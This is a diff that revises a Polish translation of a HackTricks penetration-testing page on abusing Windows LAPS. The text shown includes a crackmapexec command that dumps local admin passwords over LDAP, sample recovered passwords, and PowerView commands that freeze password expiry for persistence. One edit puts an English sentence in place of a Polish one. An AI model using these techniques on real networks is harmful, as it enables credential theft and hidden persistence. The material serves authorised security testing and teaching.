@@ -41,7 +41,7 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### LAPS Password Access
 
-Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik na format czytelny dla ludzi.
+Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik na format czytelny dla człowieka.
 
 Ponadto, **natywne cmdlety PowerShell LAPS** mogą być używane, jeśli są zainstalowane na maszynie, do której mamy dostęp:
 ```powershell
@@ -100,8 +100,8 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## **Dumping LAPS Passwords With Crackmapexec**
-Jeśli nie ma dostępu do powershell, możesz nadużyć tego uprawnienia zdalnie przez LDAP, używając
+## **Zrzucanie haseł LAPS za pomocą Crackmapexec**
+Jeśli nie ma dostępu do PowerShell, możesz nadużyć tego uprawnienia zdalnie przez LDAP, używając
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
@@ -119,7 +119,7 @@ Password: 2Z@Ae)7!{9#Cq
 
 ### **Data wygaśnięcia**
 
-Po uzyskaniu uprawnień administratora, możliwe jest **uzyskanie haseł** i **zapobieżenie** maszynie w **aktualizacji** swojego **hasła** poprzez **ustawienie daty wygaśnięcia w przyszłość**.
+Once admin, it's possible to **obtain the passwords** and **prevent** a machine from **updating** its **password** by **setting the expiration date into the future**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -129,7 +129,7 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 {% hint style="warning" %}
-Hasło nadal zostanie zresetowane, jeśli **admin** użyje polecenia **`Reset-AdmPwdPassword`**; lub jeśli w LAPS GPO jest włączona opcja **Nie pozwalaj na czas wygaśnięcia hasła dłuższy niż wymagany przez politykę**.
+Hasło nadal zostanie zresetowane, jeśli **admin** użyje polecenia **`Reset-AdmPwdPassword`**; lub jeśli w LAPS GPO jest włączona opcja **Nie zezwalaj na czas wygaśnięcia hasła dłuższy niż wymagany przez politykę**.
 {% endhint %}
 
 ### Backdoor
@@ -155,7 +155,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
 
 </details>
 {% endhint %}
